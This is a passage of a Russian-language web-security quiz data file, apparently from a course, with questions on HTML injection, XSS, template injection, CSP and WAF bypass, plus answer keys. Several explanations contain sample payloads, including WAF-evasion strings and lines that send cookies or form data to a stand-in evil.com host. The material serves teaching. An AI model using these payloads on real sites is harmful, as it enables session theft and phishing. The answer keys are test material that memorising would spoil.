        explanation: "Загрузить файл '<img src=x onerror=alert(1)>.jpg', если имя отображается в списке — XSS.",
        link: {
            label: "OWASP: File Upload",
            url: "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
        }
    },
    {
        question: "Как проверить HTMLi в URL-параметре?",
        answers: [
            "Подставить HTML-теги в параметр и проверить исходный код ответа — отрендерились или экранировались",
            "Перезагрузить страницу",
            "Нажать F5 много раз",
            "Очистить кэш браузера",
            "Открыть в режиме инкогнито",
            "Использовать VPN",
            "Изменить User-Agent"
        ],
        correctAnswerIndex: 0,
        explanation: "?search=<h1>test — если в ответе <h1>test как HTML-заголовок, а не текст '&lt;h1&gt;test' — уязвимость есть.",
        link: {
            label: "OWASP: Testing for HTMLi",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection"
        }
    },
    {
        question: "Влияет ли DOCTYPE на HTML Injection?",
        answers: [
            "Может влиять на Quirks Mode (режим совместимости), но инъекция работает в любом режиме",
            "Да, DOCTYPE запрещает инъекции",
            "Нет, DOCTYPE не влияет вообще",
            "Только HTML5 безопасен",
            "DOCTYPE устарел",
            "В Quirks Mode инъекции не работают",
            "DOCTYPE шифрует страницу"
        ],
        correctAnswerIndex: 0,
        explanation: "Quirks Mode может изменить парсинг HTML, но <script>alert(1)</script> выполнится в любом режиме.",
        link: {
            label: "MDN: DOCTYPE",
            url: "https://developer.mozilla.org/en-US/docs/Glossary/Doctype"
        }
    },
    {
        question: "Что такое Meta Tag Injection?",
        answers: [
            "Внедрение или манипуляция <meta> тегами — можно изменить CSP, сделать редирект, или повлиять на SEO",
            "Инъекция в мета-вселенную",
            "Атака на мета-данные файлов",
            "Мета-анализ уязвимостей",
            "Создание мета-классов",
            "Мета-программирование",
            "Инъекция метаболитов"
        ],
        correctAnswerIndex: 0,
        explanation: "<meta http-equiv='Content-Security-Policy' content='script-src *'> может ослабить CSP (если парсится первой).",
        link: {
            label: "MDN: meta element",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta"
        }
    },
    {
        question: "Может ли HTML Injection инициировать скачивание файла?",
        answers: [
            "Да, через <meta http-equiv='refresh'> с URL на файл, или <a download> с auto-click",
            "Нет, только JavaScript может скачивать",
            "Только вирусы скачиваются",
            "Только музыку можно скачать",
            "Браузеры блокируют все скачивания",
            "Только через специальный API",
            "Только с согласия пользователя"
        ],
        correctAnswerIndex: 0,
        explanation: "<meta http-equiv='refresh' content='0; url=https://evil.com/malware.exe'> может начать скачивание автоматически.",
        link: {
            label: "MDN: meta refresh",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta"
        }
    },
    {
        question: "Что делать, если alert() заблокирован (например, CSP)?",
        answers: [
            "Использовать confirm(), prompt(), print() для PoC, или fetch/XMLHttpRequest для эксфильтрации данных",
            "Сдаться и идти домой",
            "Использовать console.log() (он не блокируется)",
            "Ничего не делать",
            "Сообщить об ошибке",
            "Использовать document.write()",
            "alert() никогда не блокируется"
        ],
        correctAnswerIndex: 0,
        explanation: "CSP может разрешать inline-скрипты, но блокировать eval. print() открывает диалог печати — PoC без eval.",
        link: {
            label: "PortSwigger: XSS without alert",
            url: "https://portswigger.net/web-security/cross-site-scripting"
        }
    },
    {
        question: "Можно ли внедрить HTML в JSON-ответ?",
        answers: [
            "Да, если JSON отображается как text/html или вставляется в DOM через innerHTML без санитизации",
            "Нет, JSON полностью безопасен",
            "Только XML уязвим",
            "Только CSV уязвим",
            "JSON автоматически экранируется",
            "JSON.parse() защищает от HTMLi",
            "Только бинарный JSON уязвим"
        ],
        correctAnswerIndex: 0,
        explanation: "{\"name\":\"<script>alert(1)</script>\"} + innerHTML = XSS. Нужно использовать textContent или DOMPurify.",
        link: {
            label: "OWASP: JSON Hijacking",
            url: "https://owasp.org/www-community/attacks/JSON_Hijacking"
        }
    },
    {
        question: "Что такое RPO (Relative Path Overwrite)?",
        answers: [
            "Атака через относительные пути CSS/JS — браузер загружает HTML-страницу как CSS, внедряя стили атакующего",
            "Перезапись пути к файлам",
            "Относительный путь",
            "Робототехническая атака",
            "Удалённый протокол",
            "Резервное копирование путей",
            "Оптимизация путей"
        ],
        correctAnswerIndex: 0,
        explanation: "<link href='style.css'> на /page/ загрузит /page/style.css. Если /page/style.css = текущая HTML-страница с инжектированным CSS...",
        link: {
            label: "PortSwigger: RPO",
            url: "https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities"
        }
    },
    {
        question: "Может ли HTML Injection быть Stored (хранимой)?",
        answers: [
            "Да, Stored HTML Injection — пейлоад сохраняется в БД и срабатывает для всех пользователей, просматривающих контент",
            "Нет, только Reflected",
            "Только в RAM сервера",
            "Только в кэше браузера",
            "Только в localStorage",
            "Только в session storage",
            "Только в cookies"
        ],
        correctAnswerIndex: 0,
        explanation: "Комментарий с <form action='evil.com'>Войдите</form> сохраняется в БД. Все пользователи видят фишинговую форму.",
        link: {
            label: "Урок HTML Injection",
            url: "https://aqwise.github.io/security_testing_course/school/injections/lesson-3"
        }
    },
    {
        question: "В каких полях чаще всего встречается HTML Injection?",
        answers: [
            "Комментарии, отзывы, биография профиля, сообщения форума, названия товаров — любой пользовательский ввод",
            "Пароль (скрыт звёздочками)",
            "ID сессии (служебное поле)",
            "Timestamp (автоматическое)",
            "IP-адрес пользователя",
            "Хэш пароля",
            "Серийный номер"
        ],
        correctAnswerIndex: 0,
        explanation: "Любое поле, отображаемое другим пользователям без экранирования — потенциальный вектор. Чаще всего: комментарии и профили.",
        link: {
            label: "OWASP: Input Validation",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое атрибут sandbox в iframe?",
        answers: [
            "Ограничивает возможности контента в iframe — запрещает скрипты, формы, навигацию — защита при вставке стороннего контента",
            "Песочница для игр",
            "Режим отладки JavaScript",
            "Инструмент разработчика",
            "Режим тестирования",
            "Виртуальная машина",
            "Контейнер Docker"
        ],
        correctAnswerIndex: 0,
        explanation: "<iframe sandbox src='untrusted.html'> по умолчанию запрещает всё. Можно добавить allow-scripts, allow-forms по отдельности.",
        link: {
            label: "MDN: iframe sandbox",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox"
        }
    },
    {
        question: "Можно ли обойти sandbox в iframe?",
        answers: [
            "Если разрешены allow-scripts и allow-same-origin одновременно — фрейм может удалить собственный sandbox атрибут",
            "Да, sandbox легко обходится всегда",
            "Нет, sandbox невозможно обойти никогда",
            "Обход тривиален",
            "Только через эксплойт браузера",
            "Sandbox устарел и не работает",
            "Только в Firefox можно обойти"
        ],
        correctAnswerIndex: 0,
        explanation: "frame.removeAttribute('sandbox') возможен если фрейм same-origin И имеет скрипты. Поэтому не давайте оба разрешения вместе.",
        link: {
            label: "MDN: sandbox security",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox"
        }
    },
    {
        question: "Для чего нужен X-Content-Type-Options: nosniff?",
        answers: [
            "Запрещает браузеру угадывать MIME-тип — защищает от исполнения HTML/JS загруженного как картинка",
            "Запрещает сниффинг сети",
            "Запрещает скачивание файлов",
            "Ускоряет загрузку страницы",
            "Блокирует cookies",
            "Отключает JavaScript",
            "Шифрует контент"
        ],
        correctAnswerIndex: 0,
        explanation: "Без nosniff браузер может выполнить <script>alert(1)</script> из файла с Content-Type: image/png, если угадает MIME.",
        link: {
            label: "MDN: X-Content-Type-Options",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
        }
    },
    {
        question: "Что такое SSTI и как она связана с HTMLi?",
        answers: [
            "Server-Side Template Injection — может приводить к HTMLi и RCE, так как шаблонизатор рендерит пользовательский ввод",
            "Стиль CSS-инъекции",
            "Шаблон для тестирования",
            "Инъекция сервера напрямую",
            "SQL Server Template Injection",
            "Безопасная технология шаблонов",
            "Статический сайт"
        ],
        correctAnswerIndex: 0,
        explanation: "{{config}} в Jinja2 или ${7*7} в Freemarker. Если сервер отобразит конфиг или '49' — SSTI. Часто ведёт к RCE.",
        link: {
            label: "PortSwigger: SSTI",
            url: "https://portswigger.net/web-security/server-side-template-injection"
        }
    },
    {
        question: "Как проверить наличие SSTI?",
        answers: [
            "Ввести {{7*7}} или ${7*7} — если отобразится 49, шаблонизатор исполняет выражения",
            "Ввести HTML-теги",
            "Ввести SQL-запрос",
            "Ввести обычный текст",
            "Открыть консоль разработчика",
            "Проверить robots.txt",
            "Посмотреть исходный код"
        ],
        correctAnswerIndex: 0,
        explanation: "{{7*7}}=49 → Jinja2/Twig. ${7*7}=49 → Freemarker. #{7*7}=49 → Ruby ERB. Затем проверяют RCE-пейлоады.",
        link: {
            label: "HackTricks: SSTI",
            url: "https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"
        }
    },
    {
        question: "Что такое Client-Side Template Injection (CSTI)?",
        answers: [
            "Инъекция в клиентские шаблоны (AngularJS, Vue) — выражения {{...}} исполняются в браузере, что ведёт к XSS",
            "То же что SSTI",
            "Инъекция клиентских данных",
            "Инъекция в CSS-шаблоны",
            "Инъекция в PDF-шаблоны",
            "Безопасная инъекция",
            "Инъекция через CLI"
        ],
        correctAnswerIndex: 0,
        explanation: "{{constructor.constructor('alert(1)')()}} в AngularJS 1.x sandbox escape. Vue: {{_c.constructor('alert(1)')()}}.",
        link: {
            label: "PortSwigger: CSTI",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection"
        }
    },
    {
        question: "AngularJS (старые версии) уязвим к CSTI?",
        answers: [
            "Да, через {{...}} выражения можно обойти sandbox и выполнить произвольный JS",
            "Нет, AngularJS безопасен",
            "Только новые версии уязвимы",
            "Только React уязвим",
            "Angular заблокировал все инъекции",
            "Sandbox нельзя обойти",
            "Только в режиме разработки"
        ],
        correctAnswerIndex: 0,
        explanation: "AngularJS 1.0-1.5 имели sandbox с известными обходами. С 1.6+ sandbox удалён — теперь всё исполняется напрямую.",
        link: {
            label: "PortSwigger: AngularJS sandbox",
            url: "https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs"
        }
    },
    {
        question: "Как React защищает от XSS/HTMLi?",
        answers: [
            "React автоматически экранирует данные в JSX — опасны только dangerouslySetInnerHTML и javascript: в href",
            "React не защищает от XSS",
            "Нужно использовать jQuery вместо React",
            "Не использовать JSX",
            "React блокирует все теги",
            "React требует ручной санитизации",
            "Защита работает только в production"
        ],
        correctAnswerIndex: 0,
        explanation: "{userInput} в JSX безопасен. <div dangerouslySetInnerHTML={{__html: userInput}}/> или <a href={userInput}> — XSS.",
        link: {
            label: "React: dangerouslySetInnerHTML",
            url: "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"
        }
    },
    {
        question: "Что делает v-html в Vue.js?",
        answers: [
            "Выводит 'сырой' HTML без экранирования — XSS-уязвимость если данные от пользователя",
            "Выводит только текст",
            "Экранирует весь HTML",
            "Удаляет HTML-теги",
            "Валидирует HTML",
            "Безопасная альтернатива innerHTML",
            "Работает только с текстом"
        ],
        correctAnswerIndex: 0,
        explanation: "<div v-html='userInput'></div> с userInput='<script>alert(1)</script>' = XSS. Используйте {{ }} для текста.",
        link: {
            label: "Vue: v-html",
            url: "https://vuejs.org/api/built-in-directives.html#v-html"
        }
    },
    {
        question: "Какая кодировка используется в URL?",
        answers: [
            "Percent-encoding — спецсимволы заменяются на %XX: пробел=%20, <=%3C, >=%3E",
            "Base64 по умолчанию",
            "Hexadecimal без префикса",
            "Binary encoding",
            "UTF-16",
            "ASCII only",
            "ROT13"
        ],
        correctAnswerIndex: 0,
        explanation: "https://example.com?q=<script> → https://example.com?q=%3Cscript%3E. Браузер декодирует автоматически.",
        link: {
            label: "MDN: encodeURIComponent",
            url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent"
        }
    },
    {
        question: "Что такое Double Encoding?",
        answers: [
            "Двойное кодирование: < → %3C → %253C — обходит WAF, который декодирует только один раз",
            "Двойная защита паролей",
            "Двойной клик мыши",
            "Ошибка кодировки",
            "Двухфакторная аутентификация",
            "Двойное шифрование",
            "Backup кодировки"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF видит %253C как безопасную строку. Приложение декодирует дважды: %253C → %3C → <. WAF обойдён.",
        link: {
            label: "OWASP: Double Encoding",
            url: "https://owasp.org/www-community/Double_Encoding"
        }
    },
    {
        question: "Что такое Null Byte Injection (%00)?",
        answers: [
            "Вставка нулевого байта — в C-based системах обрывает строку, позволяя обойти фильтры расширений файлов",
            "Пустая инъекция",
            "Нулевая инъекция данных",
            "Байтовый код JavaScript",
            "Пустой запрос",
            "Нулевой пользователь",
            "Инъекция в нулевой индекс"
        ],
        correctAnswerIndex: 0,
        explanation: "file.php%00.jpg — PHP видит 'file.php', фильтр видит '.jpg'. Работало до PHP 5.3.4. Исторически важно.",
        link: {
            label: "OWASP: Null Byte Injection",
            url: "https://owasp.org/www-community/attacks/Embedding_Null_Code"
        }
    },
    {
        question: "В чём опасность внедрения <link rel='stylesheet'>?",
        answers: [
            "Загрузка вредоносного CSS — может менять вид страницы, скрывать элементы, или эксфильтрировать данные через CSS Exfiltration",
            "Улучшает дизайн сайта",
            "Ускоряет загрузку",
            "Нет никакой опасности",
            "Только в IE опасно",
            "Блокируется всеми браузерами",
            "Работает только в development"
        ],
        correctAnswerIndex: 0,
        explanation: "<link href='evil.com/style.css'> загружает CSS: input[value^='a']{background:url(evil.com/steal?a)} — кража данных.",
        link: {
            label: "CSS Exfiltration",
            url: "https://portswigger.net/research/stealing-data-via-css-injection"
        }
    },
    {
        question: "Что такое Canonical тег?",
        answers: [
            "<link rel='canonical'> — указывает поисковикам основную версию страницы. Инъекция может испортить SEO",
            "Каноническая инъекция кода",
            "Церковный HTML-тег",
            "Главный тег страницы",
            "Обязательный тег",
            "Тег для авторизации",
            "Тег шифрования"
        ],
        correctAnswerIndex: 0,
        explanation: "<link rel='canonical' href='https://competitor.com'> убедит Google индексировать конкурента вместо вас.",
        link: {
            label: "MDN: rel=canonical",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel#canonical"
        }
    },
    {
        question: "Можно ли инжектировать в HTML-комментарии <!-- -->?",
        answers: [
            "Да, если закрыть комментарий --> и начать свой HTML — он будет отрендерен браузером",
            "Нет, комментарии игнорируются полностью",
            "Только в XML можно",
            "Только в JavaScript комментариях",
            "Комментарии безопасны всегда",
            "Браузеры не парсят комментарии",
            "Только серверные комментарии уязвимы"
        ],
        correctAnswerIndex: 0,
        explanation: "<!-- User: USER_INPUT --> с USER_INPUT='--><script>alert(1)</script><!--' выполнит скрипт.",
        link: {
            label: "PortSwigger: XSS Contexts",
            url: "https://portswigger.net/web-security/cross-site-scripting/contexts"
        }
    },
    {
        question: "Что такое HPP (HTTP Parameter Pollution)?",
        answers: [
            "Передача нескольких параметров с одним именем — может запутать WAF или приложение и пропустить инъекцию",
            "Загрязнение HTML-страницы",
            "Протокол высокой производительности",
            "High Performance PHP",
            "HTTP Proxy Protocol",
            "Horizontal Parameter Processing",
            "Header Protection Policy"
        ],
        correctAnswerIndex: 0,
        explanation: "?id=1&id=<script> — WAF проверяет первый id=1 (безопасно), но приложение использует второй (XSS).",
        link: {
            label: "OWASP: HPP",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution"
        }
    },
    {
        question: "Как проверить, экранирует ли приложение кавычки?",
        answers: [
            "Ввести ' и \" и проверить исходный код — превратились в &apos; / &quot; или остались как есть",
            "Ввести обычный текст",
            "Нажать Enter",
            "Спросить администратора",
            "Открыть robots.txt",
            "Посмотреть cookies",
            "Очистить кэш"
        ],
        correctAnswerIndex: 0,
        explanation: "class=\"USER\" с USER='\" onclick=alert(1)' — если превратилось в &quot;, защита есть. Если осталось \" — можно выйти из атрибута.",
        link: {
            label: "OWASP: Testing for HTMLi",
            url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection"
        }
    },
    {
        question: "Что означает Sink в контексте DOM XSS/HTMLi?",
        answers: [
            "Функция или свойство DOM, куда попадают данные и происходит выполнение — innerHTML, eval, document.write",
            "Раковина в ванной",
            "Точка входа данных (Source)",
            "Корабль потоплен",
            "Синхронизация данных",
            "Хранилище данных",
            "Точка выхода"
        ],
        correctAnswerIndex: 0,
        explanation: "location.hash (source) → div.innerHTML (sink). Если hash содержит <script>, sink выполнит его.",
        link: {
            label: "PortSwigger: DOM-based XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что означает Source в контексте DOM XSS/HTMLi?",
        answers: [
            "Источник данных — location.search, location.hash, document.cookie, window.name — откуда берутся небезопасные данные",
            "Исходный код JavaScript",
            "Ресурс сервера",
            "Соус для еды",
            "Источник питания",
            "GitHub репозиторий",
            "Точка назначения"
        ],
        correctAnswerIndex: 0,
        explanation: "Source: location.search → Sink: innerHTML. Атакующий контролирует ?param=<img onerror=alert(1)>.",
        link: {
            label: "PortSwigger: DOM XSS Sources",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Какие Source-ы наиболее опасны для DOM XSS?",
        answers: [
            "location.href, location.search, location.hash, document.URL, document.referrer, window.name — контролируются атакующим",
            "document.title — заголовок страницы",
            "navigator.userAgent — агент браузера",
            "screen.width — размер экрана",
            "Math.random() — случайное число",
            "Date.now() — текущее время",
            "performance.now() — время работы"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий контролирует URL (location.*), заголовок Referer, и window.name через opener.",
        link: {
            label: "PortSwigger: DOM XSS Sources",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Какие Sink-и наиболее опасны для DOM XSS?",
        answers: [
            "innerHTML, outerHTML, document.write(), eval(), setTimeout(string), setInterval(string), jQuery.html()",
            "console.log() — вывод в консоль",
            "textContent — текстовое содержимое",
            "getAttribute() — получение атрибута",
            "classList.add() — добавление класса",
            "style.color — цвет текста",
            "focus() — фокус на элементе"
        ],
        correctAnswerIndex: 0,
        explanation: "innerHTML парсит HTML. eval() выполняет строку как JS. textContent безопасен — вставляет как текст.",
        link: {
            label: "PortSwigger: DOM XSS Sinks",
            url: "https://portswigger.net/web-security/cross-site-scripting/dom-based"
        }
    },
    {
        question: "Что такое MIME Sniffing?",
        answers: [
            "Попытка браузера определить тип контента по содержимому, игнорируя Content-Type — опасно для HTML в загрузках",
            "Нюхание сетевого трафика",
            "Определение типа файла по расширению",
            "MIME-тип почтовых вложений",
            "Сжатие медиа-файлов",
            "Протокол обнаружения",
            "Антивирусная проверка"
        ],
        correctAnswerIndex: 0,
        explanation: "Файл с Content-Type: text/plain содержащий <script>alert(1)</script> может быть выполнен, если браузер 'угадает' HTML.",
        link: {
            label: "MDN: MIME Sniffing",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#mime_sniffing"
        }
    },
    {
        question: "Как предотвратить фишинг через window.opener?",
        answers: [
            "Добавлять rel='noopener noreferrer' ко всем ссылкам с target='_blank'",
            "Не использовать ссылки вообще",
            "Не открывать новые окна",
            "Использовать только JavaScript для навигации",
            "Блокировать все внешние ссылки",
            "Требовать подтверждение пользователя",
            "Использовать HTTP вместо HTTPS"
        ],
        correctAnswerIndex: 0,
        explanation: "Современные браузеры добавляют noopener по умолчанию, но старые — нет. Всегда указывайте явно для совместимости.",
        link: {
            label: "MDN: rel=noopener",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener"
        }
    },
    {
        question: "Чем был опасен устаревший тег <applet>?",
        answers: [
            "Запускал Java-апплеты с полным доступом к системе — RCE через браузер в старых версиях",
            "Ничем не был опасен",
            "Только рисовал графики",
            "Только проигрывал музыку",
            "Был безопасной альтернативой Flash",
            "Использовался для анимации",
            "Запускал только текстовые игры"
        ],
        correctAnswerIndex: 0,
        explanation: "Java-апплеты имели полный доступ к файловой системе. Удалены из современных браузеров вместе с NPAPI.",
        link: {
            label: "MDN: applet (Deprecated)",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/applet"
        }
    },
    {
        question: "Можно ли внедрить HTML через User-Agent?",
        answers: [
            "Да, если User-Agent отображается в админке или логах без экранирования — Blind HTMLi/XSS",
            "Нет, User-Agent защищён браузером",
            "Только в мобильных браузерах",
            "Только в десктопных браузерах",
            "User-Agent нельзя изменить",
            "Только в старых браузерах",
            "User-Agent автоматически экранируется"
        ],
        correctAnswerIndex: 0,
        explanation: "curl -A '<script>alert(1)</script>' https://target.com — если логи отображаются admin-у без экранирования, XSS срабатывает.",
        link: {
            label: "Blind XSS",
            url: "https://portswigger.net/web-security/cross-site-scripting/blind"
        }
    },
    {
        question: "Что такое WAF?",
        answers: [
            "Web Application Firewall — фильтрует входящий HTTP-трафик, блокируя известные атаки по сигнатурам",
            "Web Application Form — форма веба",
            "Wide Area Fuzzing — широкое фаззинг",
            "Wireless Access File — файл беспроводного доступа",
            "Web API Framework — фреймворк API",
            "Windows Application Firewall — брандмауэр Windows",
            "Web Address Finder — поиск адресов"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF (Cloudflare, AWS WAF, ModSecurity) анализирует запросы и блокирует подозрительные по сигнатурам и правилам.",
        link: {
            label: "OWASP: WAF",
            url: "https://owasp.org/www-community/Web_Application_Firewall"
        }
    },
    {
        question: "Как WAF блокирует HTML-пейлоады?",
        answers: [
            "По сигнатурам — наличие <script>, on* событий, javascript:, union select, и др.",
            "По IP-адресу отправителя",
            "По времени отправки запроса",
            "По размеру запроса в байтах",
            "По User-Agent браузера",
            "По гео-локации пользователя",
            "По типу устройства"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF ищет паттерны: <script, onerror=, javascript:, но обходится кодированием, разбивкой, Unicode.",
        link: {
            label: "PortSwigger: WAF Bypass",
            url: "https://portswigger.net/bappstore/ae2611da3bbc4f1-8d9d8a1e7b4b6aa"
        }
    },
    {
        question: "Что такое Obfuscation?",
        answers: [
            "Запутывание пейлоада для обхода сигнатур WAF — смена регистра, Unicode, лишние пробелы, кодирование",
            "Сжатие данных",
            "Шифрование данных",
            "Удаление данных",
            "Валидация данных",
            "Логирование данных",
            "Резервное копирование"
        ],
        correctAnswerIndex: 0,
        explanation: "<SCRIPT>, <scr\\nipt>, <script/src=...>, %3Cscript%3E — всё это обфускация для обхода фильтров.",
        link: {
            label: "PortSwigger: XSS Cheat Sheet",
            url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet"
        }
    },
    {
        question: "Работает ли HTML Injection через HTTPS?",
        answers: [
            "Да, HTTPS защищает только транспорт (от перехвата), но не контент приложения — инъекция на уровне app",
            "Нет, HTTPS блокирует все инъекции",
            "Только частично защищает",
            "Данные зашифрованы и безопасны",
            "HTTPS предотвращает XSS",
            "Только HTTP уязвим",
            "HTTPS автоматически экранирует"
        ],
        correctAnswerIndex: 0,
        explanation: "HTTPS не знает о содержимом запросов/ответов. HTMLi происходит в приложении, которое обрабатывает данные.",
        link: {
            label: "OWASP: Transport Layer Security",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое document.cookie в JavaScript?",
        answers: [
            "Свойство для чтения/записи cookies — основная цель кражи при XSS (если нет HttpOnly)",
            "Документ с рецептами печенья",
            "Файл настроек браузера",
            "Кэш страницы",
            "История браузера",
            "Закладки пользователя",
            "Локальное хранилище"
        ],
        correctAnswerIndex: 0,
        explanation: "new Image().src='https://evil.com/?c='+document.cookie — классический способ кражи сессии через XSS.",
        link: {
            label: "MDN: document.cookie",
            url: "https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie"
        }
    },
    {
        question: "В чём разница между urlencode и htmlentities?",
        answers: [
            "urlencode для URL-параметров (%XX), htmlentities для HTML-контента (&entity;) — разные контексты",
            "Нет никакой разницы",
            "Одно для PHP, другое для JavaScript",
            "Одно шифрует, другое нет",
            "Одно для сервера, другое для клиента",
            "Они взаимозаменяемы",
            "urlencode безопаснее"
        ],
        correctAnswerIndex: 0,
        explanation: "URL: ?q=%3Cscript%3E. HTML: &lt;script&gt;. Использование не той функции = уязвимость.",
        link: {
            label: "PHP: htmlentities vs urlencode",
            url: "https://www.php.net/manual/en/function.htmlentities.php"
        }
    },
    {
        question: "Можно ли внедрить HTML через QR-код?",
        answers: [
            "Да, если сканер или приложение отображает содержимое QR без экранирования — внедрённый URL/текст станет HTML",
            "Нет, QR-коды безопасны",
            "Можно внедрить только картинку",
            "Можно внедрить только ссылку",
            "QR-коды шифруют данные",
            "Только в мобильных приложениях",
            "QR автоматически экранируется"
        ],
        correctAnswerIndex: 0,
        explanation: "QR→'<script>alert(1)</script>'. Если приложение отображает содержимое через innerHTML — XSS.",
        link: {
            label: "QR Code Security",
            url: "https://owasp.org/www-community/attacks/qr_code_security"
        }
    },
    {
        question: "Какой уровень риска у HTML Injection?",
        answers: [
            "Зависит от контекста: Medium (фишинг без JS) или High/Critical (если эскалируется до XSS)",
            "Всегда Critical",
            "Всегда Low",
            "Всегда Informational",
            "Не является уязвимостью",
            "Высокий только с RCE",
            "Низкий без аутентификации"
        ],
        correctAnswerIndex: 0,
        explanation: "Чистая HTMLi = фишинг, дефейс = Medium. HTMLi→XSS = кража сессий = High. SSTI→RCE = Critical.",
        link: {
            label: "CVSS Scoring",
            url: "https://www.first.org/cvss/calculator/3.1"
        }
    },
    {
        question: "Что такое Script Gadgets?",
        answers: [
            "Легитимный JS-код (библиотеки), который можно 'заставить' выполнить XSS через манипуляцию DOM без inline-скриптов",
            "Гаджеты для написания скриптов",
            "Мобильные телефоны",
            "Роботы-ассистенты",
            "Устройства IoT",
            "Расширения браузера",
            "Плагины для IDE"
        ],
        correctAnswerIndex: 0,
        explanation: "<div data-trigger='click'>...</div> если библиотека автоматически добавляет onclick из data-атрибута — можно инъектировать.",
        link: {
            label: "Script Gadgets Research",
            url: "https://github.com/nicohdemus/gadgetresearch"
        }
    },
    {
        question: "Что такое SOP (Same Origin Policy)?",
        answers: [
            "Политика браузера: скрипты с одного origin не могут читать данные другого origin — XSS обходит это, выполняясь на целевом origin",
            "Standard Operating Procedure",
            "Суп (еда)",
            "Простой протокол",
            "Политика паролей",
            "Стандарт безопасности",
            "Сертификат SSL"
        ],
        correctAnswerIndex: 0,
        explanation: "https://a.com не может читать данные https://b.com через JS. Но XSS на b.com выполняется в контексте b.com.",
        link: {
            label: "MDN: Same-origin policy",
            url: "https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy"
        }
    },
    {
        question: "Что такое Origin?",
        answers: [
            "Комбинация Протокола + Домена + Порта: https://example.com:443 — определяет границы SOP",
            "Только доменное имя",
            "Только IP-адрес",
            "Страна пользователя",
            "Источник трафика",
            "Первая страница сайта",
            "Корневая директория"
        ],
        correctAnswerIndex: 0,
        explanation: "http://example.com ≠ https://example.com (разные протоколы). example.com:80 ≠ example.com:8080 (разные порты).",
        link: {
            label: "MDN: Origin",
            url: "https://developer.mozilla.org/en-US/docs/Glossary/Origin"
        }
    },
    {
        question: "Как CSP блокирует inline-скрипты?",
        answers: [
            "CSP по умолчанию запрещает inline-скрипты и eval() — нужен 'unsafe-inline' или nonce/hash для разрешения",
            "Блокирует весь интернет",
            "Блокирует все скрипты целиком",
            "Не блокирует ничего",
            "Только внешние скрипты",
            "Только async скрипты",
            "Только defer скрипты"
        ],
        correctAnswerIndex: 0,
        explanation: "Content-Security-Policy: script-src 'self' — блокирует <script>alert(1)</script> и onclick=alert(1).",
        link: {
            label: "MDN: CSP script-src",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src"
        }
    },
    {
        question: "Что такое Nonce в CSP?",
        answers: [
            "Случайное одноразовое значение: <script nonce='abc123'> выполнится только если CSP содержит script-src 'nonce-abc123'",
            "Никто (англ. nonce)",
            "Ошибка в коде",
            "Пароль пользователя",
            "Идентификатор сессии",
            "Случайный токен CSRF",
            "Хэш пароля"
        ],
        correctAnswerIndex: 0,
        explanation: "Сервер генерирует nonce каждый запрос. XSS-пейлоад не знает значение → не может добавить nonce → блокируется.",
        link: {
            label: "MDN: CSP nonce",
            url: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script"
        }
    },
    {
        question: "Может ли HTML Injection на странице 404 быть опасной?",
        answers: [
            "Да, если страница 404 отображает URL запроса без экранирования — Reflected HTMLi в странице ошибки",
            "Нет, это просто ошибка",
            "Редко бывает опасно",
            "Только для администратора",
            "404 страницы не обрабатываются",
            "Только на старых серверах",
            "Браузер игнорирует 404"
        ],
        correctAnswerIndex: 0,
        explanation: "/nonexistent<script>alert(1)</script> → 'Страница /nonexistent<script>alert(1)</script> не найдена' → XSS.",
        link: {
            label: "OWASP: Error Page XSS",
            url: "https://owasp.org/www-project-web-security-testing-guide/"
        }
    },
    {
        question: "Что такое SameSite атрибут cookie?",
        answers: [
            "Защита от CSRF: Strict/Lax/None определяют когда cookie отправляется при кросс-сайтовых запросах",
            "Тот же самый сайт",
            "Полная защита от XSS",
            "Защита от SQL Injection",
            "Шифрование cookies",
            "Время жизни cookie",
            "Домен cookie"
        ],
        correctAnswerIndex: 0,
        explanation: "SameSite=Strict — cookie только для same-site запросов. Но XSS на том же сайте всё равно читает cookie.",
        link: {
            label: "MDN: SameSite cookies",
